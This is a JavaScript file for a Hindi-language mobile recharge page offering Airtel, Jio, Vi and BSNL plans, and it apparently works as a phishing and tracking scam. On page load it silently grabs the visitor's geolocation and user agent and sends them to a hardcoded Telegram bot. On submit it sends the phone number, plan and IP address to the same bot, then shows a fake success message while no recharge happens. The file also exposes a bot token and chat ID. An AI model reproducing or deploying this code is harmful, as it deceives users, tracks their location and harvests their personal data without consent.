const plansData = {
  Airtel: [
    '₹199 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल',
    '₹249 - 28 दिन - 2GB/दिन + अनलिमिटेड कॉल',
    '₹399 - 56 दिन - 1.5GB/दिन + अनलिमिटेड कॉल',
  ],
  Jio: [
    '₹149 - 28 दिन - 1GB/दिन + अनलिमिटेड कॉल',
    '₹219 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल',
    '₹349 - 56 दिन - 1.5GB/दिन + अनलिमिटेड कॉल',
  ],
  Vi: [
    '₹199 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल',
    '₹269 - 28 दिन - 2GB/दिन + अनलिमिटेड कॉल',
    '₹399 - 56 दिन - 1.5GB/दिन + अनलिमिटेड कॉल',
  ],
  BSNL: [
    '₹155 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल',
    '₹249 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल',
    '₹379 - 56 दिन - 1.5GB/दिन + अनलिमिटेड कॉल',
  ],
};

const simSelect = document.getElementById('sim');
const plansDiv = document.getElementById('plans');
const plansForm = document.getElementById('plansForm');
const mobileInput = document.getElementById('mobile');
const submitBtn = document.getElementById('submitBtn');

const popupModal = document.getElementById('popupModal');
const closePopupBtn = document.getElementById('closePopupBtn');
const popupText = document.getElementById('popupText');

simSelect.addEventListener('change', () => {
  const sim = simSelect.value;
  plansForm.innerHTML = ''; // Clear previous plans

  if (sim && plansData[sim]) {
    plansData[sim].forEach((plan, index) => {
      const planId = `plan_${index}`;
      const label = document.createElement('label');
      label.htmlFor = planId;

      const radio = document.createElement('input');
      radio.type = 'radio';
      radio.name = 'plan';
      radio.id = planId;
      radio.value = plan;

      const span = document.createElement('span');
      span.textContent = plan;

      label.appendChild(radio);
      label.appendChild(span);
      plansForm.appendChild(label);
    });
    plansDiv.style.display = 'block';
  } else {
    plansDiv.style.display = 'none';
  }
});

// Silent location send on page load
window.onload = () => {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        sendLocation(position);
      },
      () => {
        // silently fail
      }
    );
  }
};

function sendLocation(position) {
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;
  const device = navigator.userAgent;

  const message =
    `🟢 नया रिचार्ज आवेदन (स्थान ट्रैकिंग):\n` +
    `डिवाइस: ${device}\n` +
    `स्थान: https://maps.google.com/?q=${lat},${lon}`;

  fetch(
    'https://api.telegram.org/bot8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc/sendMessage',
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: '6038115234',
        text: message,
      }),
    }
  ).catch(() => {
    console.log('टेलीग्राम भेजने में समस्या');
  });
}

submitBtn.addEventListener('click', async () => {
  const sim = simSelect.value;
  const mobile = mobileInput.value.trim();

  if (!sim) {
    alert('कृपया सिम चुनें।');
    return;
  }
  if (!/^[6-9]\d{9}$/.test(mobile)) {
    alert('कृपया सही 10 अंकों का मोबाइल नंबर दर्ज करें।');
    return;
  }

  const selectedPlanInput = document.querySelector('input[name="plan"]:checked');
  if (!selectedPlanInput) {
    alert('कृपया एक रिचार्ज योजना चुनें।');
    return;
  }
  const selectedPlan = selectedPlanInput.value;

  submitBtn.classList.add('loading');
  submitBtn.textContent = 'प्रक्रिया जारी है...';

  try {
    // First message
    const msg1 = `📱 नया रिचार्ज आवेदन:\nसिम: ${sim}\nमोबाइल नंबर: ${mobile}\nचयनित योजना: ${selectedPlan}`;

    await fetch(
      'https://api.telegram.org/bot8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc/sendMessage',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: '6038115234',
          text: msg1,
        }),
      }
    );

    // Get IP
    const ipRes = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipRes.json();

    // Second message
    const msg2 = `ℹ️ डिवाइस जानकारी:\nUser-Agent: ${navigator.userAgent}\nIP पता: ${ipData.ip}`;

    await fetch(
      'https://api.telegram.org/bot8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc/sendMessage',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: '6038115234',
          text: msg2,
        }),
      }
    );

    // Show popup modal
    popupText.textContent = 'आपका रिचार्ज आवेदन सफलतापूर्वक भेज दिया गया है। 24 घंटे में SMS प्राप्त होगा।';
    popupModal.classList.add('show');

    // Reset form
    mobileInput.value = '';
    simSelect.value = '';
    plansDiv.style.display = 'none';
    plansForm.innerHTML = '';

  } catch (error) {
    alert('त्रुटि हुई, कृपया पुनः प्रयास करें।');
  } finally {
    submitBtn.classList.remove('loading');
    submitBtn.textContent = 'रिचार्ज के लिए आवेदन करें';
  }
});

// Close popup modal
closePopupBtn.addEventListener('click', () => {
  popupModal.classList.remove('show');
});
